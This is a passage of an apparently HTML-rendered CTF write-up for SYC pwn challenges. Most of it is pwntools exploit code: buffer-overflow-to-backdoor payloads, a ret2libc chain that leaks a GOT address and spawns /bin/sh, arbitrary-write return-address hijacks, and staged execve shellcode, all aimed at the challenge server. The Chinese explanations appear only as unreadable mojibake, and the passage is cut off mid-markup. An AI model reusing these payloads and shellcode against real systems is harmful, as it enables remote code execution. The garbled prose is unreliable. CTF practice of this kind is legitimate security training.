class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./password&#x27;</span>)</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># if(is_debug):</span></span><br><span class="line"><span class="comment">#     p = process()</span></span><br><span class="line"><span class="comment"># else:</span></span><br><span class="line"><span class="comment">#     ip = &quot;pwn.node.game.sycsec.com&quot;</span></span><br><span class="line"><span class="comment">#     port = 30872</span></span><br><span class="line"><span class="comment">#     p = remote(ip,port)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">g = <span class="keyword">lambda</span> x: gdb.attach(x)</span><br><span class="line"></span><br><span class="line"><span class="comment"># send() sendline() sendafter() sendlineafter()</span></span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(sa)</span><br><span class="line">sa = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># recv() recvline() recvuntil()</span></span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> x: p.recvline(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x20</span> + <span class="number">0x8</span>)</span><br><span class="line">payload += p64(<span class="number">0x00000000004012F3</span>) <span class="comment"># backdoor</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;pwn.node.game.sycsec.com&quot;</span></span><br><span class="line">port = <span class="number">31233</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p = remote(ip,port)</span><br><span class="line">    </span><br><span class="line">    p.sendafter(<span class="string">b&quot;name:\n&quot;</span>,payload)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;password:\n&quot;</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    s = p.recvline()</span><br><span class="line">    <span class="built_in">print</span>(s)</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">b&quot;Correct&quot;</span> <span class="keyword">in</span> s):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">    p.close()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><p>å…ˆç”¨writeæ³„éœ²gotè¡¨çš„åœ°å€ï¼Œç„¶åè®¡ç®—libcçš„åŸºåœ°å€ï¼Œæ‹¿åˆ°systemå’Œbinshåï¼Œæ­£å¸¸çš„rop</p>
<p>æ‰¾äº†åŠå¤©æ²¡æœ‰æ‰¾åˆ°ä¿®æ”¹rdxå¯„å­˜å™¨çš„gadgetï¼Œåé¢å‘ç°è¿™é‡Œæœ‰ä¸€ä¸ªéå¸¸åˆé€‚çš„gadget</p>
<p><img src="G:\ctf\sycctf\img\1698472420151.png" alt="1698472420151"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./ret2libc&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_debug):</span><br><span class="line">    p = process()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ip = <span class="string">&quot;pwn.node.game.sycsec.com&quot;</span></span><br><span class="line">    port = <span class="number">31982</span></span><br><span class="line">    p = remote(ip,port)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">g = <span class="keyword">lambda</span> x: gdb.attach(x)</span><br><span class="line"></span><br><span class="line"><span class="comment"># send() sendline() sendafter() sendlineafter()</span></span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(sa)</span><br><span class="line">sa = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># recv() recvline() recvuntil()</span></span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> x: p.recvline(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line"></span><br><span class="line">rdi = <span class="number">0x0000000000401333</span></span><br><span class="line">rsi_r15 = <span class="number">0x0000000000401331</span></span><br><span class="line">csu1 = <span class="number">0x0000000000401310</span></span><br><span class="line">csu2 = <span class="number">0x0000000000401326</span></span><br><span class="line">main = <span class="number">0x000000000040126F</span></span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line">init_proc = <span class="number">0x0000000000401000</span></span><br><span class="line">rdx = <span class="number">0x0000000000401288</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># g(p)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&quot;This challenge no backdoor!&quot;</span>,flat([</span><br><span class="line">    <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x10</span> + <span class="number">0x8</span>),</span><br><span class="line">    rsi_r15, elf.got.write, <span class="number">0</span>, rdx,</span><br><span class="line">]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">leek_write = u64(ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">f&quot;success-&gt; <span class="subst">&#123;<span class="built_in">hex</span>(leek_write)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_base = leek_write - libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">success(<span class="string">f&quot;libc_base-&gt; <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh= libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">success(<span class="string">f&quot;system-&gt; <span class="subst">&#123;<span class="built_in">hex</span>(system)&#125;</span>&quot;</span>)</span><br><span class="line">success(<span class="string">f&quot;binsh-&gt; <span class="subst">&#123;<span class="built_in">hex</span>(binsh)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># g(p)</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&quot;This challenge no backdoor!&quot;</span>,flat([</span><br><span class="line">    <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x10</span> + <span class="number">0x8</span>),</span><br><span class="line">    rdi,binsh,system</span><br><span class="line">]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<p>çœ‹åˆ°çš„ä¸€ç§å¾ˆæœ‰æ„æ€çš„åšæ³•ï¼Œ<a target="_blank" rel="noopener" href="https://www.cnblogs.com/mumuhhh/p/17860207.html">https://www.cnblogs.com/mumuhhh/p/17860207.html</a> è¿™é‡Œï¼Œç”¨magic gadgetï¼Œé…åˆcsuå®ç°ä»»æ„åœ°å€å†™ï¼Œå†™gotè¡¨ï¼Œç„¶åå†™one gadgetçš„åœ°å€æ¥getshell</p>
<h2 id="write1"><a href="#write1" class="headerlink" title="write1"></a>write1</h2><p>*((_BYTE *)v2 + v1) +&#x3D; tmp; è¿™é‡Œæœ‰ä¸€ä¸ªä»»æ„åœ°å€å†™çš„æ¼æ´ï¼Œå¯ä»¥ä¸€ä¸ªå­—èŠ‚ä¸€ä¸ªå­—èŠ‚çš„ä¿®æ”¹æ•°æ®ï¼Œç¨‹åºä¸­æœ‰ä¸€ä¸ªbackdoorå‡½æ•°ï¼Œå¯ä»¥æŠŠè¿”å›åœ°å€ä¿®æ”¹æˆbackdoorç„¶åå†è¾“å…¥ä¸€ä¸ª&lt;0çš„æ•°é€€å‡ºå¾ªç¯ï¼Œæ³¨æ„__isoc99_scanf(â€œ%xâ€, &amp;tmp); æ˜¯åå…­è¿›åˆ¶çš„ï¼Œæ‰€ä»¥è¾“å…¥ä¹Ÿåº”è¯¥æ˜¯åå…­è¿›åˆ¶çš„</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">do_something</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-24h] BYREF</span></span><br><span class="line">  __int64 v2[<span class="number">3</span>]; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, &amp;s);</span><br><span class="line">  v2[<span class="number">0</span>] = s;</span><br><span class="line">  v2[<span class="number">1</span>] = qword_404098;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">    <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;value:&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%x&quot;</span>, &amp;tmp);</span><br><span class="line">    *((_BYTE *)v2 + v1) += tmp;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./write&#x27;</span>)</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_debug):</span><br><span class="line">    p = process()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ip = <span class="string">&quot;pwn.node.game.sycsec.com&quot;</span></span><br><span class="line">    port = <span class="number">31253</span></span><br><span class="line">    p = remote(ip,port)</span><br><span class="line">       </span><br><span class="line">g = <span class="keyword">lambda</span> x: gdb.attach(x)</span><br><span class="line"></span><br><span class="line"><span class="comment"># send() sendline() sendafter() sendlineafter()</span></span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># recv() recvline() recvuntil()</span></span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> x: p.recvline(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sl(<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">b&#x27;40&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;-0x28&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">b&#x27;41&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;-0x1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="ezpwn"><a href="#ezpwn" class="headerlink" title="ezpwn"></a>ezpwn</h2><p>ret2shellcode 0x13h - 0x8 &#x3D; 11ä¸ªå­—èŠ‚ï¼Œè¿™ä¸ªå¤ªéš¾å—äº†ï¼Œä¸€å¼€å§‹æƒ³ç€æŠŠshellcodeæ‹†æˆä¸¤åŠï¼ŒååŠæ®µæ”¾åœ¨å¼€å§‹ï¼Œå‰åŠæ®µæ”¾åœ¨åé¢ï¼Œç„¶åç»“å°¾jmpï¼Œç¬¬ä¸€æ¬¡å°è¯•å†™shellcodeï¼Œå†™æ¥å†™å»æœ€çŸ­ä¹Ÿè¦22ä¸ªå­—èŠ‚ï¼Œç½‘ä¸Šæ‰¾äº†ä¸€äº›16å­—èŠ‚çš„å‘ç°éƒ½æœ‰äº›é—®é¢˜ã€‚åé¢å‘ç°syscallå†readå†readä¸€éå†™è¶³å¤Ÿå¤§çš„ä½ç½®ä¸å°±å¥½äº†</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">; Segment type: Pure code</span><br><span class="line">; Segment permissions: Read/Execute</span><br><span class="line">_text segment byte public <span class="string">&#x27;CODE&#x27;</span> use64</span><br><span class="line">assume cs:_text</span><br><span class="line">;org <span class="number">801000</span>h</span><br><span class="line">assume es:nothing, ss:nothing, ds:LOAD, fs:nothing, gs:nothing</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">; Attributes: bp-based frame</span><br><span class="line"></span><br><span class="line">; <span class="type">void</span> <span class="title function_">fun</span><span class="params">()</span></span><br><span class="line">public fun</span><br><span class="line">fun proc near</span><br><span class="line"></span><br><span class="line">anonymous_0= byte ptr <span class="number">-20</span>h</span><br><span class="line"></span><br><span class="line">; __unwind &#123;</span><br><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">sub     rsp, <span class="number">20</span>h</span><br><span class="line">xor     eax, eax</span><br><span class="line">xor     edi, edi        ; fd</span><br><span class="line">mov     rsi, rsp        ; buf</span><br><span class="line">mov     edx, <span class="number">13</span>h        ; count</span><br><span class="line">syscall                 ; LINUX - sys_read</span><br><span class="line">add     rsi, <span class="number">8</span></span><br><span class="line">jmp     rsi</span><br><span class="line">; &#125; <span class="comment">// starts at 801000</span></span><br><span class="line">fun endp</span><br><span class="line"></span><br><span class="line">_text ends</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./ezpwn&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_debug):</span><br><span class="line">    p = process()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ip = <span class="string">&quot;pwn.node.game.sycsec.com&quot;</span></span><br><span class="line">    port = <span class="number">31578</span></span><br><span class="line">    p = remote(ip,port)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">g = <span class="keyword">lambda</span> x: gdb.attach(x)</span><br><span class="line"></span><br><span class="line"><span class="comment"># send() sendline() sendafter() sendlineafter()</span></span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># recv() recvline() recvuntil()</span></span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> x: p.recvline(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"><span class="comment"># syscall read</span></span><br><span class="line">shellcode1 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    xor eax,eax</span></span><br><span class="line"><span class="string">    push 0x50</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    add rsi,11</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode1 = <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span> + asm(shellcode1)</span><br><span class="line"><span class="comment"># g(p)</span></span><br><span class="line">s(shellcode1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># g(p)</span></span><br><span class="line"><span class="comment">#execve(/bin/sh)</span></span><br><span class="line">shellcode2 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rax,0x68732f6e69622f</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    push rsp</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    push 0x3b</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    xor esi, esi</span></span><br><span class="line"><span class="string">    xor edx, edx</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># shellcode2 = asm(shellcraft.sh())</span></span><br><span class="line">shellcode2 = asm(shellcode2)</span><br><span class="line"></span><br><span class="line">s(shellcode2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="write2"><a href="#write2" class="headerlink" title="write2"></a>write2</h2><p>vmmap å‘ç°æ ˆä¸Šæœ‰å¯æ‰§è¡Œçš„æƒé™ï¼Œä»»æ„åœ°å€å†™ï¼Œç›´æ¥å¾€rbp + 16å†™shellcodeï¼Œç„¶åæŠŠrbp + 8æ”¹æˆrbp + 16çš„åœ°å€å°±å¥½äº†</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./write2&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_debug):</span><br><span class="line">    p = process()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ip = <span class="string">&quot;pwn.node.game.sycsec.com&quot;</span></span><br><span class="line">    port = <span class="number">30602</span></span><br><span class="line">    p = remote(ip,port)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">g = <span class="keyword">lambda</span> x: gdb.attach(x)</span><br><span class="line"></span><br><span class="line"><span class="comment"># send() sendline() sendafter() sendlineafter()</span></span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># recv() recvline() recvuntil()</span></span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> : p.recvline()</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&quot;index_addr:&quot;</span>)</span><br><span class="line">addr = <span class="built_in">int</span>(p.recv(<span class="number">14</span>).decode(<span class="string">&quot;utf-8&quot;</span>),<span class="number">16</span>) </span><br><span class="line">return_addr = addr + <span class="number">0x34</span></span><br><span class="line">success(<span class="string">f&quot;return_addr -&gt; <span class="subst">&#123;<span class="built_in">hex</span>(return_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rax,0x68732f6e69622f</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    push rsp</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    push 0x3b</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    xor esi, esi</span></span><br><span class="line"><span class="string">    xor edx, edx</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span 